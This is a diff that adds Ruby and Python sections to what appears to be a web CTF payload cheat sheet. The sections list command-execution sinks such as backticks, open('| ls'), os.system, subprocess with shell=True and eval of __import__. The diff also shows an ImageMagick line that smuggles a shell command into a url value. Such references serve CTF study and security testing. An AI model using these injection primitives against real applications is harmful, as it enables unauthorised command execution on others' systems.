@@ -492,6 +492,37 @@ fill 'url(https://kaibro.tw";ls "-la)'
 pop graphic-context
 ```
 
+## Ruby 
+
+- `open("| ls")`
+- `IO.popen("ls").read`
+- `Kernel.exec("ls")`
+- ``` `ls` ```
+- `system("ls")`
+- `eval("ruby code")`
+    - Non-Alphanumeric example: HITCON CTF 2015 - Hard to say
+        - `$$/$$` => 1
+        - `'' << 97 << 98 << 99` => "abc"
+- `exec("ls")`
+- `%x{ls}`
+- Net::FTP
+    - CVE-2017-17405
+    - use `Kernel#open`
+
+## Python
+- `os.system("ls")`
+- `os.popen("ls").read()`
+- `os.execl("/bin/ls","")`
+- `os.execlp("ls","")`
+- `os.execv("/bin/ls",[''])`
+- `os.execvp("/bin/ls",[""])`
+- `subprocess.call("ls")`
+    - `subprocess.call("ls|cat",shell=False)` => Fail
+    - `subprocess.call("ls|cat",shell=True)` => Correct
+- `eval("__import__('os').system('ls')")`
+- `exec("__import__('os').system('ls')")`
+- `commands.getoutput('ls')`
+
 # SQL Injection
 
 
